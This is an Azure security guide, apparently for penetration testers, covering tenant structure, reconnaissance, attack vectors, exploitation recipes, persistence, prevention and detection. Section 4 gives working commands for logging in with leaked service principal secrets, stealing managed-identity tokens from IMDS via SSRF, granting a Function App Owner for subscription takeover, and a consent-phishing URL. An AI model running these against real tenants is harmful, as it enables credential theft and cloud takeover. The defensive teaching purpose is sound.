# Azure Fundamentals

> [!CAUTION]
> This file is for authorized security testing of Azure subscriptions and tenants you own or have explicit written permission to assess. Do not use these techniques against subscriptions, tenants, or services you do not own or have permission to test.

## 1. Overview

Microsoft Azure is a cloud platform organized around four nested scopes: the **tenant** (a Microsoft Entra ID directory, identified by a tenant ID), the **management group** (a tree of subscriptions for policy and RBAC inheritance), the **subscription** (a billing and quota boundary), and the **resource group** (a logical container for resources in one region). Every resource in Azure lives in a resource group, every resource group lives in a subscription, every subscription lives under a management group, and every management group belongs to exactly one tenant.

Two authorization planes run in parallel, and confusing them is the most common source of Azure misconfiguration:

- **Azure RBAC (control plane).** Roles like `Owner`, `Contributor`, `Reader` are assigned to security principals (users, groups, service principals, managed identities) at a scope (management group, subscription, resource group, or resource). The role assignment is inherited down the scope tree.
- **Entra ID roles (directory plane).** Roles like `Global Administrator`, `User Administrator`, `Application Administrator` are assigned inside the Entra ID directory itself, not on Azure resources. A `Global Administrator` in Entra ID is not automatically an `Owner` on a subscription, and an `Owner` on a subscription is not automatically a `Global Administrator`.

A third plane is **Azure Policy**. Policy is not authorization; it is a guardrail that evaluates resource properties against rules and can deny creation, audit non-compliance, or auto-remediate. A policy can block an `Owner` from creating a public IP address, for example, even though the `Owner` has the RBAC permission to do so.

This file covers the fundamentals that every other Azure file in this subcategory builds on: the tenant and subscription model, the RBAC evaluation, the main service families (compute, storage, networking, identity, secrets, logging), and the reconnaissance surface an attacker sees from outside and from inside the tenant.

## 2. Reconnaissance / Enumeration

### 2.1 External reconnaissance (no credentials)

Azure tenants expose a small but useful unauthenticated surface:

- **Tenant ID discovery** via the OpenID Connect configuration endpoint: `https://login.microsoftonline.com/<domain>/v2.0/.well-known/openid-configuration` returns the tenant ID for any verified domain. Many organizations publish `autodiscover.<domain>` and `enterpriseregistration.<domain>` records that confirm Entra ID usage.
- **Subdomain takeover** via dangling `CNAME` records pointing to `*.azurewebsites.net`, `*.cloudapp.azure.com`, `*.blob.core.windows.net`, `*.azurefd.net`. A deleted App Service plan leaves the CNAME dangling; an attacker who registers the same name in their own Azure subscription serves content under the trusted domain.
- **Public storage accounts** via `https://<account>.blob.core.windows.net/<container>?restype=container&comp=list`. A `200` response means the container is publicly listable.
- **Public IP ranges** published by Microsoft at `https://www.microsoft.com/en-us/download/details.aspx?id=56519` (Azure IP ranges and service tags). An attacker uses the list to correlate IP addresses to Azure services.

### 2.2 Authenticated reconnaissance

With any valid credential (a leaked service principal secret, a compromised user account, a managed identity token), the first three calls establish the identity and the scope:

```bash
# Current identity
az account show

# All subscriptions visible to the identity
az account list --all --output table

# Current tenant ID and the identity's object ID
az ad signed-in-user show
```

`az account show` returns the subscription ID, tenant ID, user name, and the identity type (`user`, `servicePrincipal`, `managedIdentity`). For a service principal, `az ad sp show --id <appId>` returns the role assignments and the credentials attached to the app registration.

### 2.3 Enumerating the control plane

Azure RBAC is granular, so "I can see it" and "I can use it" are different questions. The read-only enumeration surface:

```bash
# Role assignments at the current scope and below
az role assignment list --all --output table

# Resources in the current subscription
az resource list --output table

# Key Vaults and their access policies
az keyvault list --output table
az keyvault show --name <vault-name> --query 'properties.accessPolicies'

# Storage accounts and their public access settings
az storage account list --query '[].{Name:name,AllowBlobPublicAccess:allowBlobPublicAccess,AllowSharedKeyAccess:allowSharedKeyAccess}'

# Virtual machines and their managed identities
az vm list --query '[].{Name:name,Identity:identity,ResourceGroup:resourceGroup}'

# App Service and Function Apps
az webapp list --query '[].{Name:name,State:state,Identity:identity}'
az functionapp list --query '[].{Name:name,State:state,Identity:identity}'
```

### 2.4 Enumerating the directory plane

Entra ID (formerly Azure AD) is a separate API surface. Enumeration depends on the permissions of the current identity:

```bash
# Users, groups, service principals, app registrations
az ad user list --output table
az ad group list --output table
az ad sp list --all --output table
az ad app list --all --output table

# Directory roles (Global Administrator, etc.)
az rest --method GET --url 'https://graph.microsoft.com/v1.0/directoryRoles'

# Conditional Access policies (requires Policy.Read.All)
az rest --method GET --url 'https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies'
```

The directory plane is where the most valuable persistence lives: a new app registration with a client secret, a new federated identity credential, or a new directory role assignment. Those are covered in `02 Entra ID and Identity Attacks.md`.

## 3. Common Attack Vectors

### 3.1 Credential leakage

The most common way into an Azure tenant is a leaked credential:

- A service principal client secret in a public GitHub repository or a CI/CD job log.
- A user account with a password reused from a breach, without MFA enforced.
- A managed identity token stolen via SSRF from an Azure VM, App Service, or Function App (the Azure Instance Metadata Service at `http://169.254.169.254/metadata/identity/oauth2/token`).
- A delegated OAuth consent grant that allows an attacker-controlled application to act as the user.

### 3.2 RBAC misconfiguration

Azure RBAC is powerful and easy to over-grant:

- `Owner` at the subscription scope instead of a scoped custom role.
- `Contributor` on a resource group that contains a managed identity with more privilege.
- User Access Administrator delegated broadly, which allows the assignee to grant any role to any principal, including themselves.
- Custom roles with `*/read` and `*/write` actions.
- Role assignments on a management group that inherit to every subscription below it.

### 3.3 Public network exposure

- Storage accounts with `AllowBlobPublicAccess: true`.
- Network security groups (NSGs) with `0.0.0.0/0` on 22, 3389, 1433, 3306, 5432.
- Key Vault with public network access enabled and no firewall (the default for many deployments).
- App Services with `publicNetworkAccess: Enabled` and no access restrictions.
- Azure SQL with `Allow Azure services and resources to access this server` enabled, which opens the firewall to every Azure IP.

### 3.4 The Azure Instance Metadata Service (IMDS)

Every Azure VM, App Service, Function App, and container instance can request a managed identity token from `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` with the header `Metadata: true`. An SSRF in a web application on any of these services reaches IMDS and receives a token for the managed identity. The token is a full bearer credential for the Azure Resource Manager API.

### 3.5 Consent phishing

An attacker registers an application in their own tenant, requests delegated permissions (`Mail.Read`, `Files.ReadWrite.All`, `User.Read`), and sends a consent link to a target user. If the user consents, the attacker's application can act as that user without ever knowing the password. Consent phishing bypasses MFA because the user authenticates legitimately and then grants the application access.

### 3.6 Dangling DNS and subdomain takeover

An Azure resource with a public DNS name (`*.azurewebsites.net`, `*.cloudapp.azure.com`, `*.blob.core.windows.net`) is deleted but the DNS record is not. An attacker registers the same name in their own subscription, and the DNS record now points to attacker-controlled content.

## 4. Exploitation Recipes

### 4.1 From a leaked service principal secret to subscription access

Precondition: an application ID and a client secret leaked in a public repository or CI log. The service principal may be assigned to any scope: tenant, management group, subscription, resource group, or resource.

```bash
# Authenticate as the service principal
az login --service-principal \
    -u <application-id> \
    -p <client-secret> \
    --tenant <tenant-id>

# Confirm the identity and its scope
az account show

# Enumerate role assignments at every scope the identity can see
az role assignment list --all --assignee <application-id> --output table

# Enumerate resources in every visible subscription
for sub in $(az account list --query '[].id' -o tsv); do
    az account set --subscription "$sub"
    az resource list --output table
done
```

Expected output of `az account show`:

```json
{
  "environmentName": "AzureCloud",
  "id": "00000000-0000-0000-0000-000000000000",
  "tenantId": "11111111-1111-1111-1111-111111111111",
  "user": {
    "name": "00000000-0000-0000-0000-000000000000",
    "type": "servicePrincipal"
  }
}
```

### 4.2 From SSRF to IMDS managed identity token

Precondition: a public App Service, Function App, or VM with a system-assigned or user-assigned managed identity, and an SSRF vulnerability in the application.

```bash
# IMDS token request (from inside the instance, or via SSRF)
curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Expected output:

```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...",
  "expires_in": "3599",
  "expires_on": "1730000000",
  "not_before": "1729996400",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
```

The `access_token` is a full bearer token for the Azure Resource Manager API. It can be used directly with `curl` or with the Azure CLI:

```bash
# Use the stolen token with the Azure CLI
az login --identity   # NOT this: this only works from inside the VM
# Instead, use the token directly:
curl -s -H "Authorization: Bearer <access_token>" \
    "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

### 4.3 Subscription takeover through a privileged managed identity

Precondition: the current identity can create or modify a resource that can have a managed identity attached, and it can assign a privileged role to a managed identity. App Service, Function App, and Automation Account are the most common targets.

```bash
# Create a Function App with a system-assigned managed identity
az functionapp create --resource-group attacker-rg \
    --consumption-plan-location eastus \
    --runtime python --runtime-version 3.11 \
    --functions-version 4 \
    --name attacker-func \
    --storage-account attackerstorage \
    --assign-identity "[system]"

# Read the managed identity's principal ID
PRINCIPAL=$(az functionapp identity show --name attacker-func --resource-group attacker-rg --query principalId -o tsv)

# Assign Owner at the subscription scope (requires User Access Administrator or Owner)
az role assignment create --assignee "$PRINCIPAL" --role Owner --scope "/subscriptions/<subscription-id>"
```

The Function App now has `Owner` on the subscription. Any code executed in the function can call the Azure Resource Manager API with `Owner` privileges, and the attacker can pivot to every resource in the subscription.

### 4.4 Consent phishing as an external attacker

Precondition: an attacker-controlled tenant and a target user who is allowed to grant consent to applications. The attacker registers an app, adds delegated Microsoft Graph permissions, and sends the consent URL.

```bash
# Consent URL (attacker sends this to the target)
# The target authenticates legitimately and grants the listed permissions
https://login.microsoftonline.com/<target-tenant>/oauth2/v2.0/authorize?client_id=<attacker-app-id>&response_type=code&redirect_uri=<attacker-redirect>&scope=https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Files.ReadWrite.All https://graph.microsoft.com/User.Read&state=12345
```

After consent, the attacker exchanges the authorization code for an access token and refreshes it indefinitely (offline access). MFA does not prevent this because the user authenticated and then consented.

## 5. Post-Exploitation

After obtaining Azure credentials, the attacker's priorities are persistence, privilege escalation, and data access.

- **Persistence via a new app registration** with a client secret (`az ad app create` + `az ad app credential reset`) and a role assignment on a subscription. This is the Azure equivalent of a backdoor IAM user.
- **Persistence via a federated identity credential** on an existing app registration (a trust relationship with an external OIDC provider that the attacker controls). This survives password changes and secret rotation.
- **Persistence via a managed identity** with a role assignment. Managed identities cannot be exported, but the resource that holds the identity can be modified to run attacker code.
- **Privilege escalation** via `User Access Administrator` (which allows granting any role to any principal, including self), `Microsoft.Authorization/roleAssignments/write` on a broad scope, or `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action` combined with resource creation.
- **Data access** via Key Vault `Microsoft.KeyVault/vaults/secrets/read`, Storage `Microsoft.Storage/storageAccounts/listKeys/action` (which returns the account keys, bypassing RBAC on individual blobs), SQL `Microsoft.Sql/servers/databases/read` + `db_datareader` on the database.

## 6. Preventive Controls

- **Eliminate long-lived service principal secrets.** Use workload identity federation (OIDC) from GitHub Actions, Azure DevOps, or any OIDC provider. SCP-equivalent: Azure Policy that denies `Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials` without an approved issuer.
- **Enforce MFA and Conditional Access.** Block legacy authentication, require compliant devices for administrative roles, and use Privileged Identity Management (PIM) for just-in-time role activation.
- **Restrict consent to verified publishers.** Set the tenant consent policy to `Do not allow user consent` or `Allow user consent for apps from verified publishers, for selected permissions`.
- **Scope role assignments tightly.** Never assign `Owner` at the subscription or management group scope unless the principal is a break-glass account. Use custom roles with explicit actions.
- **Disable public network access on storage, Key Vault, and SQL** unless the resource genuinely serves the public internet, and use private endpoints otherwise.
- **Enforce IMDS protection with Azure Policy.** The `Managed Identity` should be scoped per workload, and the workload should validate the token audience before using it.
- **Use Azure Policy to deny risky configurations.** Public blob access, public IP on a VM without an approved tag, NSG rules with `0.0.0.0/0` on management ports.

## 7. Detection Controls

The two primary logs are **Entra ID sign-in logs** and **Azure Activity logs**. Both feed Microsoft Sentinel and Microsoft Defender for Cloud.

- **Entra ID sign-in logs** - every authentication. Alert on: sign-ins from new countries or anonymous IPs, sign-ins with legacy authentication, sign-ins with a `riskySignIn` flag from Identity Protection, service principal sign-ins from new IPs.
- **Entra ID audit logs** - directory changes. Alert on: new app registration, new client secret added to an app, new federated identity credential, new directory role assignment, consent grant to a new application.
- **Azure Activity logs** - control-plane operations. Alert on: `Microsoft.Authorization/roleAssignments/write` (privilege change), `Microsoft.KeyVault/vaults/secrets/read` (secret access), `Microsoft.Storage/storageAccounts/listKeys/action` (account key retrieval), `Microsoft.Compute/virtualMachines/runCommand/action` (remote command), `Microsoft.ManagedIdentity/userAssignedIdentities/*`.
- **NSG flow logs and VNet flow logs** - network-level traffic, with a documented gap: the IMDS endpoint `169.254.169.254` is link-local and does not appear in flow logs.
- **Microsoft Defender for Cloud** - findings and alerts that overlap with this file: `Suspicious service principal activity`, `Unusual sign-in activity`, `Suspicious Azure Resource Manager activity`, `Access from an unusual location`.

## 8. Verification

Read-only checks to confirm the preventive controls are in place:

```bash
# Role assignments at subscription and management group scope
az role assignment list --scope "/subscriptions/<subscription-id>" --include-inherited --output table
az role assignment list --scope "/providers/Microsoft.Management/managementGroups/<mg-id>" --include-inherited --output table

# Service principals with credentials (client secrets and certificates)
az ad sp list --all --query '[?passwordCredentials[0] || keyCredentials[0]].{Name:displayName,AppId:appId}' --output table

# Storage accounts with public blob access
az storage account list --query '[?allowBlobPublicAccess==`true`].{Name:name,ResourceGroup:resourceGroup}'

# Key Vaults with public network access
az keyvault list --query '[?properties.publicNetworkAccess==`Enabled`].{Name:name,ResourceGroup:resourceGroup}'

# NSG rules with 0.0.0.0/0 on 22 or 3389
az network nsg list --query '[].{Name:name,Rules:securityRules[?sourceAddressPrefix==`*` || sourceAddressPrefix==`0.0.0.0/0`]}'
```

Expected result: no `Owner` at subscription scope except break-glass and CI/CD service principals; no service principal with a credential older than 90 days; no storage account with public blob access; no Key Vault with public network access; no NSG rule opening 22 or 3389 to the internet.

## 9. Certification Alignment

- **Microsoft Certified: Azure Security Engineer Associate (AZ-500)** - identity, platform protection, data protection, security operations.
- **Microsoft Certified: Azure Administrator Associate (AZ-104)** - RBAC, storage, compute, networking.
- **Microsoft Certified: Azure Network Engineer Associate (AZ-700)** - VNet design, hybrid connectivity, NSG rules.
- **CompTIA Security+** - identity and access management, least privilege, logging and monitoring.

## 10. Production Notes

- The Entra ID tenant is the ultimate trust boundary. A `Global Administrator` can grant any permission in the tenant; there is no separation-of-duties equivalent to the AWS `root` account break-glass model. Use PIM and a break-glass pair of accounts.
- Azure RBAC and Entra ID roles are distinct. A `Global Administrator` who is not an `Owner` on a subscription cannot read Key Vault secrets; an `Owner` who is not a `Global Administrator` cannot reset a user's password.
- Managed identities do not have credentials to leak, but the resource that holds the identity is a credential-equivalent. Protect the resource with the same care as a password.
- The Azure IMDS token is a bearer token for the Resource Manager API. It is short-lived (around one hour) but it is enough for a complete subscription takeover if the identity has the right scope.
- Consent phishing bypasses MFA. The only durable control is a restrictive user-consent policy and a Conditional Access rule that requires admin approval for new applications.

## 11. References

- Microsoft Azure documentation - https://learn.microsoft.com/en-us/azure/
- Microsoft Entra ID documentation - https://learn.microsoft.com/en-us/entra/
- Azure RBAC documentation - https://learn.microsoft.com/en-us/azure/role-based-access-control/
- Azure Policy documentation - https://learn.microsoft.com/en-us/azure/governance/policy/
- Azure Instance Metadata Service - https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service
- Microsoft Defender for Cloud - https://learn.microsoft.com/en-us/azure/defender-for-cloud/
- Microsoft Sentinel - https://learn.microsoft.com/en-us/azure/sentinel/
